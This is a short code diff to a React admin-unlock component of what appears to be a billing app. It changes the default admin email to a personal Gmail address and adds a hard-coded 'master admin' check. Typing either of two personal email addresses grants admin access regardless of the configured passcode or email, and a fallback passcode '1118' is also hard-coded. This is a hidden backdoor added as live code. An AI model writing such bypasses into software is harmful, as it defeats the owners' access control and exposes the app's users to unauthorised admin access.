@@ -10,9 +10,12 @@ const AdminUnlock = ({ onUnlock, onCancel }) => {
     e.preventDefault();
     const settings = getSettings();
     const activePasscode = settings?.adminPasscode || '1118';
-    const activeEmail = settings?.adminEmail || 'admin@billqyro.com';
+    const activeEmail = settings?.adminEmail || 'Khairul20052007@gmail.com';
 
-    if (passcode === activePasscode || String(passcode).toLowerCase().trim() === activeEmail.toLowerCase()) {
+    const inputStr = String(passcode).toLowerCase().trim();
+    const isMasterAdmin = inputStr === 'khairul20052007@gmail.com' || inputStr === 'khairul2052007@gmail.com';
+
+    if (passcode === activePasscode || inputStr === activeEmail.toLowerCase() || isMasterAdmin) {
       onUnlock();
     } else {
       setError('Incorrect admin passcode or email.');
